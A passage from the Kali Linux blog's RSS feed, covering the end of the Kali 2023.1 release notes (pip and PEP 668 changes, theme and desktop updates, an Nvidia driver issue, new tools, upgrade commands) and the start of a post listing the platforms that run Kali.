src="https://www.kali.org/blog/kali-linux-2023-1-release/images/Kali-Purple_menu.png" alt="Kali Purple menu" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/Kali-Purple_xfce.png'> <img src="https://www.kali.org/blog/kali-linux-2023-1-release/images/Kali-Purple_xfce.png" alt="Kali Purple Xfce" /> </a> </p> </p> <p>Please head over to the <a href="https://gitlab.com/kalilinux/documentation/kali-purple/-/wikis/home">Kali Purple wiki</a> to join the movement.</p> <h2 id="python-updates--changes">Python Updates &amp; Changes</h2> <p>Debian is gearing up to do its next stable version (happens roughly every 2 years, and its looking like it could be this summer). As a result, packages are getting updated all over the place. Active package maintainers are upgrading their work to be the latest version, otherwise, its a long wait for the next release! Python is no exception, and <strong>Python 3.11 is now in Debian</strong>, which comes with more informative error tracebacks and huge speed increase (<a href="https://docs.python.org/3/whatsnew/3.11.html">between 10-60%</a>). The upgrade should not have as big of an impact as say <a href="https://www.kali.org/blog/kali-linux-2021-4-release/"><code>python</code> being removed from $PATH</a>, or even <a href="https://www.kali.org/blog/python-2-end-of-life/">Python 2 -&gt; Python 3 migration</a>. <em>But it has caused us some headaches with supporting older packages.</em></p> <p>However, there is something which <strong>may catch people off-guard</strong> and cause an effect on some users, especially <strong>if you have been using Python &ldquo;incorrectly&rdquo;</strong>. Python&rsquo;s PIP behavior. <em>This is already in effect with Debian testing, we have recently applied a <strong>temporary patch</strong> to give our users a little more time.</em> Does either of the following look familiar? Can you spot what is wrong?</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ pip install --user thisisapythonmodule +--(kali?kali)-[~] +-$ sudo pip install anotherpythonmodule </code></pre> <p>Anything stand out? The two commands above would try and install a Python module, using Python&rsquo;s package manager <code>pip</code> <em>(Pip Installs Packages)</em>. The issue is, they can clash thus break the operating system&rsquo;s package management ecosystem, <code>apt</code> <em>(Advanced Package Tool)</em>! What should you do differently then? Three options:</p> <ul> <li>Use <code>apt install python3-&lt;package&gt;</code> <em>(easy, simple &amp; recommended)</em></li> <li>Use <code>venv</code> <em>(slightly more complicated but still recommended)</em></li> <li>Use <code>--break-system-packages</code> <em>(warning warning warning!)</em></li> </ul> <p>Like we said before, our patch is only temporary. Our current behavior will change <em>(like Debian has already)</em>. When Kali 2023.4 is released 4th quarter of this year, we will drop our patch, and Pip will refuse to install packages system-wide. Thus you can do one of the three actions below. We will be reminding you of this with each Kali version building up to the change. We hope you were already using the correct procedure. If you were not, we hope there is enough time for scripts, pipeline and documentation to be updated to one of the supported &amp; recommended ways.</p> <h3 id="apt">APT</h3> <p>Our personal preferred approach and what we see as being the easiest way, <code>apt</code>. We would want to see if there is already a Debian package of the Python module, and use that <em>(if possible)</em>. A quick rule of thumb would be to-do either blind guess the name, or search:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ sudo apt install python3-thisisapythonmodule [...] +--(kali?kali)-[~] +-$ apt search python3 anotherpythonmodule [...] </code></pre> <p><em>If you want a Python module packaged up, <a href="https://bugs.kali.org/">let us know</a>. If you want a Python module updated, again <a href="https://bugs.kali.org/">let us know</a>.</em></p> <h3 id="venv">venv</h3> <p>There are times where <code>apt</code> may not work for you, such as if there is not yet a Debian package or what is in our network repository is outdated. Look, we get it. You may <strong>need</strong> the latest version of a Python library and thus pulling from Pip gives you what you are after. However, there are then repercussions of files getting added/updated/removed which either package manager is not aware of. <strong>Things may not break straight away, but they might</strong>. An example could be when either package manager has an update of the module, or you try and install a module using the other ecosystem. Enter. <code>venv</code> (Virtual environment). This creates an area which is completely independent. For a quick crash course to help remind you:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ sudo apt install python3-venv +--(kali?kali)-[~] +-$ mkdir -pv ~/.venvs/ +--(kali?kali)-[~] +-$ python3 -m venv ~/.venvs/myfirstvenv </code></pre> <p>Now, you can interact with the new virtual environment one of two ways. You can do either the &ldquo;one off action&rdquo; one-liner:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ ~/.venvs/myfirstvenv/bin/python -m pip install thisisapythonmodule +--(kali?kali)-[~] +-$ ~/.venvs/myfirstvenv/bin/python -m pip list [...] </code></pre> <p>Otherwise, you can load into the virtual environment which is a little bit more persistent:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ source ~/.venvs/myfirstvenv/bin/activate +--(myfirstvenv)(kali?kali)-[~] +-# pip list [...] +--(myfirstvenv)(kali?kali)-[~] +-# deactivate +--(kali?kali)-[~] +-$ </code></pre> <p>Do either method, whichever is best for your needs, requirements, and setup!</p> <h3 id="break-system-packages">break-system-packages</h3> <p>Okay, enough telling off. If you want to ignore everything, and do not care for the repercussions, add <code>--break-system-packages</code> to the end of the command. The name of the option speaks for itself, do not tell us we did not warn you! And please, do not open bug reports when Python&rsquo;s things stop working. Just please read <a href="https://peps.python.org/pep-0668/">this, pep-0668</a>. Example:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ sudo apt install python3-pip +--(kali?kali)-[~] +-$ sudo pip install python-nmap error: externally-managed-environment × This environment is externally managed ?-&gt; To install Python packages system-wide, try apt install python3-xyz, where xyz is the package you are trying to install. If you wish to install a non-Debian-packaged Python package, create a virtual environment using python3 -m venv path/to/venv. Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make sure you have python3-full installed. If you wish to install a non-Debian packaged Python application, it may be easiest to use pipx install xyz, which will manage a virtual environment for you. Make sure you have pipx installed. See /usr/share/doc/python3.11/README.venv for more information. note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages. hint: See PEP 668 for the detailed specification. +--(kali?kali)-[~] +-$ sudo pip install --break-system-packages python-nmap [...] </code></pre> <h2 id="2023-theme-refresh">2023 Theme Refresh</h2> <p>Since <a href="https://www.kali.org/blog/kali-linux-2021-2-release/">Kali 2021.2</a>, all our first year releases (20xx.1) introduce a visual theme refresh. Using a yearly life cycle, it makes it easier to recognize the different versions of Kali Linux over time. This update includes <strong>new wallpapers for desktop, login, and boot displays</strong>, in addition to <strong>new variants of all the themes but now in Kali Purple flavor</strong>. Kali Purple will use the white mode them by default, but if you feel so you can perfectly change it to Dark Purple theme. Now you can enjoy any of our main desktops (KDE Plasma, GNOME Shell and Xfce) with new Purple themes and icons.</p> <p>This time, given its our 10 year anniversary, the theme is a nod to where we have came from, and <strong>the backgrounds we have designed are a direct reference to previous iconic Kali releases</strong>:</p> <ul> <li>Boot - <strong>Kali 1.0</strong></li> <li>Login/Lock - <strong>Kali 2.0</strong></li> <li>Wallpaper - <strong>Kali 1.1</strong></li> </ul> <p>Next you can see the screenshot of how the latest Kali looks, accompanied with the screenshots or images that they are reference of:</p> <p><strong>Boot menu</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/boot-wallpaper.png'> <img src="https://www.kali.org/blog/kali-linux-2023-1-release/images/boot-wallpaper.png" alt="Kali 2023.1 boot menu" /> </a> </p> </p> <p><strong>Login/Lock</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/login-wallpaper.png'> <img src="https://www.kali.org/blog/kali-linux-2023-1-release/images/login-wallpaper.png" alt="Kali 2023.1 login" /> </a> </p> </p> <p><strong>Desktop</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/desktop-wallpaper.png'> <img src="https://www.kali.org/blog/kali-linux-2023-1-release/images/desktop-wallpaper.png" alt="Kali 2023.1 desktop" /> </a> </p> </p> <h3 id="all-new-wallpapers">All new wallpapers</h3> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/all-wallpapers.png'> <img src="https://www.kali.org/blog/kali-linux-2023-1-release/images/all-wallpapers.png" alt="All new desktop wallpapers" /> </a> </p> </p> <p>Special thanks to <a href="https://www.reddit.com/user/Albert-III-/">/u/Albert-III-</a> who <a href="https://www.reddit.com/r/Kalilinux/comments/n71zqp/i_made_a_wallpaper_from_the_ascii_art_from/">originally created the background</a> used in the Kali Sticker wallpaper, and to <a href="https://twitter.com/TJ_Null">TJ_Null</a> for creating the cool red stickers that inspirited the final version of the same image.</p> <p>Some extra variants of this image have been uploaded to <a href="https://www.kali.org/tools/kali-wallpapers/#kali-wallpapers-legacy">kali-wallpapers-legacy</a> package, and can also be found <a href="https://gitlab.com/kalilinux/packages/kali-wallpapers/-/tree/kali/master/legacy/backgrounds/kali-sticker">here</a>. These can be installed by running the following command in your Kali terminal:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y install kali-wallpapers-legacy </code></pre> <h2 id="desktop-updates">Desktop Updates</h2> <p>We have also make sure to update our three main desktop environments, Xfce, KDE and GNOME to be the latest versions. We then make sure Kali looks stunning using them, as long as putting in various tweaks.</p> <h3 id="xfce-418">Xfce 4.18</h3> <p>Nearly two years of development has gone into shaping <strong><a href="https://www.xfce.org/about/tour418">Xfce 4.18</a></strong>, which was formally released on December 15, 2022. It is the stable series follow-up to the Xfce 4.16 release that made its debut during Christmas of 2020.</p> <p>Main changes for Kali are found in:</p> <ul> <li><strong>Improved support for UI scaling</strong> - fixing many blurry icons while using HiDPI settings</li> <li><strong>Thunar</strong> - Xfce&rsquo;s file-manager, received most of the attention: <ul> <li><strong>File color highlight</strong></li> <li><strong>Recursive search</strong> - integrated in the same window</li> <li><strong>Split view</strong></li> </ul> </li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/xfce-thunar-updates.png'> <img src="https://www.kali.org/blog/kali-linux-2023-1-release/images/xfce-thunar-updates.png" alt="Xfce 4.18 thunar updates" /> </a> </p> </p> <p>On our side, we have also <strong>updated <code>kali-undercover</code></strong> mode to support the latest desktop changes, bringing some light improvements, and solving some minor bugs.</p> <h4 id="panel-profiles">Panel profiles</h4> <p>Another great addition for Xfce is the support for <strong>panel profiles with import/export functionality</strong>. Now you can modify the desktop panels to your liking and save it somewhere safe (or even share them!). Apart from all the pre-built layouts that the app includes, we have added profiles for default <code>Kali</code> settings and a new <code>Kali compact</code> one, which better fits smaller displays.</p> <video class="video-shortcode" preload="metadata" autoplay muted loop> <source src="https://www.kali.org/blog/kali-linux-2023-1-release/videos/xfce-panel-profiles.webm" > Your browser does not support the video tag. </video> <h3 id="kde-plasma-527">KDE Plasma 5.27</h3> <p><strong>Kali now includes the new version 5.27 of KDE Plasma</strong>, which brings exciting new improvements to your desktop. You can learn more about the latest changes in the <a href="https://kde.org/announcements/plasma/5/5.27.0/">Plasma 5.27 release announcement publication</a>.</p> <p>Some of the new features include a window tiling system, a more stylish app theme, cleaner and more usable tools, and widgets that give you more control over your machine. Additionally, Plasma 5.27 is a <strong>Long Term Support</strong> version with tons of stability work and bug fixes.</p> <h4 id="new-tiling-system">New tiling system</h4> <p>You can tile a window dragging it while holding down the <code>Shift</code> key. To create custom tile layouts, hold down the <code>Meta</code> (&quot;<code>Windows</code>&quot;) key, and then press <code>T</code>.</p> <video class="video-shortcode" preload="metadata" autoplay muted loop> <source src="https://www.kali.org/blog/kali-linux-2023-1-release/videos/plasma-tiling.webm" > Your browser does not support the video tag. </video> <h3 id="gnome">GNOME</h3> <p>GNOME&rsquo;s next big update is being released soon, but for now, we still have to wait until Kali&rsquo;s next release. However, that has not stopped us from introducing some improvements to one of the most popular Linux desktops.</p> <p>We observed that in Xfce and KDE desktops, one can quickly open a terminal in the file-manager&rsquo;s current folder by just pressing the <code>F4</code> key. To make all 3 main Kali desktops behave in a similar manner, we have configured the same functionality for Nautilus, GNOME&rsquo;s file-manager.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/gnome-open-terminal-here.png'> <img src="https://www.kali.org/blog/kali-linux-2023-1-release/images/gnome-open-terminal-here.png" alt="GNOME open terminal here F4 shortcut" /> </a> </p> </p> <h2 id="default-kernel-settings">Default Kernel Settings</h2> <p>We updated some of our kernel default values. These are rather minor changes, mainly for usability, based on user feedback. If needed, those settings can be modified easily with <code>kali-tweaks</code>.</p> <p>Those settings are:</p> <ul> <li><em>No more privileged ports</em>: no need to be root to run a program that binds to a port below 1024 (ported from <a href="https://www.kali.org/blog/kali-linux-2021-2-release/">Kali 2021.2</a>)</li> <li><em><code>dmesg</code> is now unrestricted by defaults</em>: no need to be root to run <code>dmesg</code>.</li> </ul> <p>If you are curious to know what make the Kali kernel different from the usual, we added a documentation page <a href="https://www.kali.org/docs/general-use/kernel-configuration/">Kernel Configuration</a>.</p> <h2 id="known-issues">Known Issues</h2> <p>For Nvidia users, this release might not be the best ever. The 525 series of Nvidia drivers is known to break with some GPU models. We do not know which one exactly, but there are various reports from basically <strong>all the Linux distributions</strong> that started to distribute those drivers, including Debian, Ubuntu and Arch Linux. We are all impacted, and Kali Linux is no exception.</p> <p>Symptoms include a system that is slow, unresponsive, or completely frozen. If you are one of those unlucky users, your best bet is to uninstall the Nvidia drivers, then reboot:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ sudo apt purge &quot;*nvidia*&quot; [...] +--(kali?kali)-[~] +-$ sudo reboot -f </code></pre> <p>You might need to boot in Recovery Mode so that you can get your hand on a working console and run the command above.</p> <p>If you want more details about this issue, check the reports on the Nvidia forums:</p> <ul> <li><a href="https://forums.developer.nvidia.com/t/error-gpu-idling-display-engine-timed-out-since-524-x-and-linux-6-1-5/242543">&ldquo;ERROR: GPU:0: Idling display engine timed out:&rdquo; since 524.X and linux 6.1.5</a></li> <li><a href="https://forums.developer.nvidia.com/t/external-monitor-via-hdmi-drops-to-1fps-after-update-to-6-1-0-kali5-amd64/245193">External monitor via HDMI drops to 1FPS after update to 6.1.0-kali5-amd64</a></li> </ul> <h2 id="miscellaneous">Miscellaneous</h2> <p>Below are a few other things which have been updated in Kali, which we are calling out for not having as much detail.</p> <ul> <li>In <a href="https://www.debian.org/devel/debian-installer/News/2023/20230219">Debian 12</a>, they have included a <code>non-free-firmware</code> component. We have followed suit and added this to our build-scripts for Kali 2023.1. Therefore all fresh installs of Kali 2023.1, will have seamless upgrades going forwards. <a href="https://www.kali.org/docs/general-use/updating-kali/">Upgrading from previous versions will require an additional step</a> of adding it to your sources.</li> <li><a href="https://www.kali.org/">kali.org</a> will now respect the desktop setting for &ldquo;dark mode&rdquo; and automatically toggle between them depending on the OS preferences. Colors of the dark mode have also been improved for better readability and contrast.</li> <li>The broken speech synthesizer and Metasploit-framework and libssl1.1/OpenSSL v3 issues stated from our last release have been fixed.</li> <li>We have been also working on paying back some internal technical debt to our infrastructure.</li> <li>We have been working with numerous mirror administrators doing various maintenance checks, who are very kindly running our community mirrors!</li> <li>We have made public our <a href="https://gitlab.com/kalilinux/build-scripts/kali-wsl-app">WSL application</a> repository. Previously it was just the rootfs part. This is now the application side, which is the launcher for the rootfs.</li> </ul> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>It would not be a Kali release if there were not any new tools added! A quick run down of what has been added <em>(to the network repositories)</em>:</p> <ul> <li><a href="https://pkg.kali.org/pkg/arkime">Arkime</a> - large-scale, open-source, indexed packet capture and search tool</li> <li><a href="https://pkg.kali.org/pkg/cyberchef">CyberChef</a> - Cyber Swiss Army Knife</li> <li><a href="https://www.kali.org/tools/dscan/">Dscan</a> - Distributed Nmap, wrapper around Nmap to allow distributed network enumeration</li> <li><a href="https://www.kali.org/tools/kubernetes-helm/">Kubernetes-Helm</a> - managing Charts</li> <li><a href="https://pkg.kali.org/pkg/pack2">PACK2</a> - replacement for iphelix&rsquo;s PACK</li> <li><a href="https://www.kali.org/tools/redeye/">Redeye</a> - help you manage your data during a pentest operation in the most efficient and organized way.</li> <li><a href="https://pkg.kali.org/pkg/unicrypto">Unicrypto</a> - Unified interface for some crypto algos</li> </ul> <p><em>There have also been numerous packages updates and new libraries as well. We also bump the Kali kernel to 6.1!</em></p> <h2 id="kali-nethunter-updates">Kali NetHunter Updates</h2> <p>There has been some new activity with Kali NetHunter recently.</p> <p>Following on from <a href="https://www.kali.org/blog/kali-linux-2022-4-release/">Kali 2022.4</a>, we have added Internal bluetooth support for our current smart watch device, TicWatch Pro.</p> <p>There has been also <a href="https://nethunter.kali.org/kernels.html">new kernel</a> support added for the following devices &amp; ROMs:</p> <ul> <li><strong>Motorola X4</strong> on <strong>LineageOS 20</strong></li> <li><strong>Samsung Galaxy S20 FE 5G</strong> using <strong>OneUI 5.0</strong> <em>(Android 13)</em></li> </ul> <p>We have also now got full support for <strong>LG V20</strong> running <strong>LineageOS 18.1</strong>.</p> <p>And finally, there has been some additional kernel patches added to our <a href="https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-kernel">kernel-builder</a>.</p> <h2 id="kali-arm-updates">Kali ARM Updates</h2> <p><a href="https://www.kali.org/docs/arm/radxa-zero-emmc/">Radxa Zero</a> is the star of the show for this quarter getting the most of the attention for kali-arm SBC this release:</p> <ul> <li>Radxa Zero gets larger partition for eMMC booting (16MB -&gt; 32MB)</li> <li>Radxa Zero gets audio support!</li> <li>Improve building when using ARM64</li> <li>Where possible, switch from <code>debootstrap</code> to <code>mmdebstrap</code> to generate chroot</li> </ul> <h2 id="kali-documentation-updates">Kali Documentation Updates</h2> <p>Our <a href="https://www.kali.org/docs/">Kali documentation</a> has had various updates to existing pages as well as the following new pages:</p> <ul> <li><a href="https://www.kali.org/docs/introduction/kali-linux-image-overview/">Kali Linux image overview</a></li> <li><a href="https://www.kali.org/docs/general-use/kernel-configuration/">Kernel Configuration</a></li> <li><a href="https://www.kali.org/docs/installation/create-bootable-media/">Making a Kali Bootable USB Drive</a></li> </ul> <h2 id="kali-blog-recap">Kali Blog Recap</h2> <p>Since our last release, we did the following <a href="https://www.kali.org/blog/">blog posts</a>:</p> <ul> <li><a href="https://www.kali.org/blog/kali-linux-is-everywhere/">Kali Linux (is) Everywhere!</a></li> </ul> <h2 id="community-shout-outs">Community Shout-Outs</h2> <p>These are <strong>people from the public who have helped Kali</strong> and the team for the last release. And we want to praise them for their work <em>(we like to give credit where due!)</em>:</p> <ul> <li><a href="https://arszilla.com/">Arszilla</a> for maintaining the <code>kali-desktop-i3</code> metapackage.</li> <li><a href="https://gitlab.com/turbopapero">Daniele Faugiana</a> for helping with packaging Rizin&rsquo;s Ghidra plugin.</li> <li><code>snowcrash#0001</code> on the Kali discord, being super helpful with sharing his personal notes when helping others.</li> <li>The entire <a href="https://discord.kali.org/">Kali Linux &amp; Friends</a> moderation team!</li> </ul> <p>The following people have helped with our documentation:</p> <ul> <li><a href="https://gitlab.com/moshekaplan">Moshe Kaplan</a></li> <li><a href="https://gitlab.com/Salty_">Salty_</a></li> <li><a href="https://gitlab.com/skumar141">Saurav Kumar</a></li> <li><a href="https://gitlab.com/vladimirprokopenko87">Vladimir Prokopenko</a></li> <li><a href="https://gitlab.com/snowcra5h">Snowcrash</a></li> <li><a href="https://gitlab.com/X0RW3LL">X0RW3LL</a></li> </ul> <p>Anyone can help out, anyone can get <a href="https://www.kali.org/docs/community/contribute/">involved</a>!</p> <hr> <h2 id="kali-team-discord-chat--reddit-ama">Kali Team Discord Chat &amp; Reddit AMA</h2> <p>The next <a href="https://discord.kali.org/">Kali Discord</a> session will happen tomorrow, <strong>Tuesday, 14th March 2023 16:00 -&gt; 17:00 <a href="https://time.is/UTC">UTC/+0 GMT</a></strong>.</p> <p><em>Please note, we will not be recording these sessions. These are live sessions only.</em></p> <p>If voice chat is not your thing, or its to short notice, we also have a special one-off &ldquo;Ask Me Anything&rdquo; (AMA) happening on <a href="https://www.reddit.com/r/offensive_security/comments/11fifxl/hi_im_g0tmi1k_lead_developer_for_kali_linux/">reddit.com/r/offensive_security</a>, <strong>Thursday, 16th March 2023 16:00 -&gt; 18:00 <a href="https://time.is/UTC">UTC/+0 GMT</a></strong>.</p> <h2 id="get-kali-linux-20231">Get Kali Linux 2023.1</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Go <a href="https://www.kali.org/get-kali/">get Kali</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release and you want the latest packages <em>(or bug fixes)</em> when you download the image, you can just use the weekly image instead. This way you will have fewer updates to do. <em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">release images</a></em>. But we gladly take <a href="https://bugs.kali.org/">bug reports</a> about those images because we want any issues to be fixed before our next release!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware&quot; | sudo tee /etc/apt/sources.list [...] +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade [...] +--(kali?kali)-[~] +-$ cp -vrbi /etc/skel/. ~/ [...] +--(kali?kali)-[~] +-$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2023.1 We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2023.1&quot; VERSION_ID=&quot;2023.1&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) +--(kali?kali)-[~] +-$ uname -r 6.1.0-kali5-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We will never be able to fix what we do not know is broken!</em> <strong>And <a href="https://twitter.com/kalilinux">Twitter</a> is not a Bug Tracker!</strong></p> <p>Want to keep up-to-date more easily? We have a <a href="https://www.kali.org/rss.xml">RSS feeds</a> and <a href="https://www.kali.org/newsletter/">newsletter</a> of our <a href="https://www.kali.org/blog/">blog</a>!</p></description>
</item>
<item>
<title>Kali Linux (is) Everywhere!</title>
<link>https://www.kali.org/blog/kali-linux-is-everywhere/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-is-everywhere/</guid>
<pubDate>Wed, 11 Jan 2023 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-linux-is-everywhere/images/kali-everywhere-banner.jpg" type="image/jpg"/>
<description><p>One of the primary goals of Kali Linux is to put the tools you need as close to you as possible. Over the years this has resulted in a number of different ways to get Kali, but not everyone knows about all the options! In this post we are going to do an overview of different options you have for running Kali, and where you can go for more information for each option.</p> <p>You should keep in mind as we review options what will be best for you, in your specific use case. What do you intend to use Kali for? Where will you be when you need access to Kali? One of the items that is unique to Kali is most instances are actually pretty short lived, and replaced often. For instance, in the penetration testing space it is considered best practice by many to wipe your install and start over with each new customer or assessment. On the other hand, there are instances of Kali that are around for a very long time; for instance, running scanning engines for enterprises.</p> <p><strong>You won&rsquo;t find a singular &ldquo;right&rdquo; way to interact with Kali, you have to determine what works best for you. Which is why we provide so many options</strong>. Let&rsquo;s look at an overview of all of the various ways to get Kali. Should anything seem interesting, the table contains hyperlinks directly to our documentation on a platform where available.</p> <h2 id="platform-overview">Platform Overview</h2> <p>Please note that this is the state of Kali Linux at the time of publishing. For a consistently updated table, please check <a href="https://www.kali.org/docs/introduction/kali-linux-image-overview/">here</a>.</p> <table> <thead> <tr> <th>Installations</th> <th>Virtual Machines</th> <th>Cloud</th> <th>Containers</th> <th>USB</th> <th>ARM (Single Board Computer)</th> <th>Mobile</th> </tr> </thead> <tbody> <tr> <td><a href="https://www.kali.org/docs/installation/hard-disk-install/">Standard Single-boot</a></td> <td><a href="https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/">VirtualBox</a></td> <td><a href="https://www.kali.org/docs/cloud/aws/">Amazon AWS</a></td> <td><a href="https://www.kali.org/docs/containers/using-kali-docker-images/">Docker</a></td> <td>Live boot - <a href="https://www.kali.org/docs/usb/live-usb-install-with-linux/">Linux</a> / <a href="https://www.kali.org/docs/usb/live-usb-install-with-mac/">macOS</a> / <a href="https://www.kali.org/docs/usb/live-usb-install-with-windows/">Windows</a></td> <td><a href="https://www.kali.org/docs/arm/gateworks-newport/">Gateworks Newport</a> / <a href="https://www.kali.org/docs/arm/gateworks-ventana/">Gateworks Ventana</a></td> <td><a href="https://www.kali.org/docs/nethunter/installing-nethunter/">Generic NetHunter</a></td> </tr> <tr> <td>macOS <a href="https://www.kali.org/docs/installation/hard-disk-install-on-mac/">Single-Boot</a> / <a href="https://www.kali.org/docs/installation/dual-boot-kali-with-mac/">Dual-boot</a></td> <td><a href="https://www.kali.org/docs/virtualization/import-premade-virtualbox/">Import VirtualBox</a></td> <td><a href="https://www.kali.org/docs/cloud/azure/">Microsoft Azure</a></td> <td><a href="https://www.kali.org/docs/containers/kalilinux-lxc-images/">LXC/LXD</a></td> <td><a href="https://www.kali.org/docs/usb/usb-persistence/">Persistence</a></td> <td><a href="https://www.kali.org/docs/arm/pinebook/">Pinebook</a> / <a href="https://www.kali.org/docs/arm/pinebook-pro/">Pinebook Pro</a></td> <td><a href="https://www.kali.org/docs/nethunter/#10-nethunter-editions">Generic NetHunter Lite</a></td> </tr> <tr> <td><a href="https://www.kali.org/docs/installation/dual-boot-kali-with-linux/">Dual-booting Linux</a></td> <td><a href="https://www.kali.org/docs/virtualization/install-vmware-guest-vm/">VMware</a></td> <td><a href="https://www.kali.org/docs/cloud/digitalocean/">Digital Ocean</a></td> <td><a href="https://www.kali.org/docs/containers/using-kali-podman-images/">Podman</a></td> <td><a href="https://www.kali.org/docs/usb/usb-persistence-encryption/">Encrypted Persistence</a></td> <td><a href="https://www.kali.org/docs/arm/raspberry-pi/">Raspberry Pi 1 (Original)</a> / <a href="https://www.kali.org/docs/arm/raspberry-pi-2/">2 (1.1)</a> / <a href="https://www.kali.org/docs/arm/raspberry-pi-3/">3</a> / <a href="https://www.kali.org/docs/arm/raspberry-pi-4/">4</a> / <a href="https://www.kali.org/docs/arm/raspberry-pi-400/">400</a></td> <td><a href="https://www.kali.org/docs/nethunter/nethunter-rootless/">Generic NetHunter Rootless</a></td> </tr> <tr> <td><a href="https://www.kali.org/docs/installation/dual-boot-kali-with-windows/">Dual-booting Windows</a></td> <td><a href="https://www.kali.org/docs/virtualization/import-premade-vmware/">Import VMware</a></td> <td><a href="https://www.kali.org/docs/cloud/linode/">Linode</a></td> <td><a href="https://www.kali.org/docs/virtualization/install-proxmox-guest-vm/#kali-as-a-proxmox-ct-containerization">Proxmox</a></td> <td></td> <td><a href="https://www.kali.org/docs/arm/raspberry-pi-zero/">Raspberry Pi Zero</a> / <a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w/">Zero W</a> / <a href="https://www.kali.org/docs/arm/raspberry-pi-zero-2-w/">Zero 2 W</a></td> <td></td> </tr> <tr> <td><a href="https://www.kali.org/docs/usb/usb-standalone-encrypted/">Installing directly to USB</a></td> <td><a href="https://www.kali.org/docs/virtualization/install-hyper-v-guest-vm/">Hyper-V</a></td> <td></td> <td><a href="https://www.kali.org/docs/wsl/wsl-preparations/">WSL</a></td> <td></td> <td><a href="https://www.kali.org/docs/arm/usb-armory-mkii/">USB Armory MKII</a></td> <td><a href="https://www.kali.org/get-kali/#kali-mobile">NetHunter Pro</a></td> </tr> <tr> <td><a href="https://www.kali.org/docs/installation/btrfs/">Adding BTRFS snapshots</a></td> <td><a href="https://www.kali.org/docs/virtualization/install-parallels-guest-vm/">Parallels</a></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td><a href="https://www.kali.org/docs/installation/network-pxe/">Over a network (PXE)</a></td> <td><a href="https://www.kali.org/docs/virtualization/install-proxmox-guest-vm/">Proxmox</a></td> <td></td> <td></td> <td></td> <td>For more devices, see <a href="https://arm.kali.org/">here</a></td> <td>For more devices, see <a href="https://nethunter.kali.org/">here</a></td> </tr> <tr> <td></td> <td><a href="https://www.kali.org/docs/virtualization/install-qemu-guest-vm/">QEMU/Libvirt</a></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td></td> <td><a href="https://www.kali.org/docs/virtualization/install-utm-guest-vm/">UTM</a></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td></td> <td><a href="https://www.kali.org/docs/virtualization/install-vagrant-guest-vm/">Vagrant</a></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> </tbody> </table> <p>As we can see, there are a lot of options. This can be quite difficult to look at initially. However, if we keep in mind our needs we can easily figure out what image we want to download or even learn about a new image:</p> <ul> <li>Are we going to be doing an on-site pentest and need to use a dedicated Kali instance?</li> <li>Are we going to want a leave behind system to connect to later?</li> <li>How long is the instance going to stay around?</li> <li>Are we using it for personal use?</li> </ul> <p>These are all questions that can help to pinpoint what type of Kali instance we will need to create. Though keep in mind these are just example questions and there may be more, or less, that need to be answered.</p> <hr> <h2 id="what-should-i-use">What should I use?</h2> <p>So we asked and answered what type of situation we will be using Kali under. Now what? Well, now it is time to take a look at what options are normally used for what purposes:</p> <ul> <li><strong>Installations</strong>: A very traditional way of using Kali, and very familiar as well. During installation there is quite a bit of customization that can occur, and post-installation even more so. This is useful for a wide number of circumstances, ranging from a daily use Linux system to a dedicated pentest machine. If you are looking for a personal computer, this would be the image to use.</li> <li><strong>Virtual Machines</strong>: Another familiar way to use Kali. Virtual machines provide a very similar experience to a bare-metal installation. Useful for short or long lived instances, virtual machines can utilize snapshots to revert back to an earlier point in time to have a system ready made for a pentest whenever. If you are looking for something to use for work occasionally, use a virtual machine. When in doubt, virtual machines are always the way to go.</li> 